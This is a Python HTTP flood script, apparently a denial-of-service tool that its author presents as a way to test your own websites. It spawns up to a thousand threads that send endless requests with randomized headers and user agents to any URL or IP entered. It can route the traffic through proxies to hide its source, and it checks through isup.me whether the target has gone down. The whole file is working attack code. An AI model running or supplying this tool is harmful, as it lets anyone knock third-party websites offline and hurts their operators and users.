# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru
import threading
import urllib.request
import time
import random
import sys
import string

# Global parameters
thread_limit = 1000
referrer = ""
request_methods = ["GET", "HEAD"]
timeout_max = 30
timeout_min = 0
user_agents = []  # in file 'useragents.txt'
proxies = []  # in file 'proxies.txt' if none - attack directly
url = []  # from file 'urls.txt' or enter manually
append_rand_string_to_url = False
# Global parameters end


class Flooder(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            while True:
                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                q1 = str(round(random.uniform(0.5, 0.7), 1))
                q2 = str(round(random.uniform(0.7, 1), 1))
                cur_header = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain; q=" + q1 + ", text/html, "
                                                      "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
                    "Keep-Alive": "300",
                    "Connection": "Keep-Alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "User-agent": random.choice(user_agents),
                    "Referrer": referrer,
                    "Accept-Encoding": "gzip,deflate"
                }
                request = urllib.request.Request(random.choice(url), headers=cur_header) if not append_rand_string_to_url else urllib.request.Request(url + randstr, headers=cur_header)
                if len(proxies) > 0:
                    proxy = {"http": "http://%s" % random.choice(proxies)}
                    proxy_support = urllib.request.ProxyHandler(proxy)
                    opener = urllib.request.build_opener(proxy_support, urllib.request.HTTPHandler())
                    urllib.request.install_opener(opener)
                request.method = random.choice(request_methods)
                response = urllib.request.urlopen(request, timeout=random.randint(timeout_min, timeout_max))
        except:
            sys.exit()
            pass


class Checker(threading.Thread):
    current_sec = None

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                self.current_sec = time.localtime().tm_sec
                try:
                    req = urllib.request.Request("http://isup.me/" + target.netloc + target.path)
                    if urllib.request.urlopen(req).read().decode().find("It's just you") > 0:
                        status = "up"
                    else:
                        status = "down"
                    print("The website is", status)
                except:
                    print("Can't check website status")


class SettingsReader():
    def __init__(self):
        self.read_useragents()
        self.read_urls()
        self.read_proxies()

    @staticmethod
    def read_file_to_array(file_desc):
        file_desc.seek(0)
        array = [line.strip() for line in file_desc]
        return array

    def read_useragents(self):
        global user_agents
        file = open("useragents.txt", "a+")
        user_agents = self.read_file_to_array(file)
        if len(user_agents) == 0:
            def_user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1797.2 Safari/537.36'
            user_agents.append(
                def_user_agent)
            file.write(
                def_user_agent)
        file.close()

    def read_urls(self):
        global url, target
        file = open("urls.txt", "a+")
        url = self.read_file_to_array(file)
        if len(url) == 0:
            print('Enter target url or IP ( e.g. "http://google.com/" or "http://195.208.0.133/"):')
            target = input()
            url.append(target)
        file.close()

    def read_proxies(self):
        global proxies
        file = open("proxies.txt", "a+")
        proxies = self.read_file_to_array(file)
        file.close()




SettingsReader()

target = urllib.parse.urlparse(random.choice(url))
if target.netloc.__len__() == 0:
    print("Incorrect url input")
    sys.exit()
if str(target.path).__len__() == 0:
    str_target = target.scheme + "://" + target.netloc + target.path + "/"
    target = urllib.parse.urlparse(str_target)
str_target = target.scheme + "://" + target.netloc + target.path
# preparations ended

print("Flooding %s" % target.netloc)
print(str(len(user_agents))+' user agents detected')
print(str(len(url))+' urls detected')
print(str(len(proxies))+' proxies detected')

Checker().start()
while True:
    if threading.active_count() <= thread_limit:
        Flooder().start()
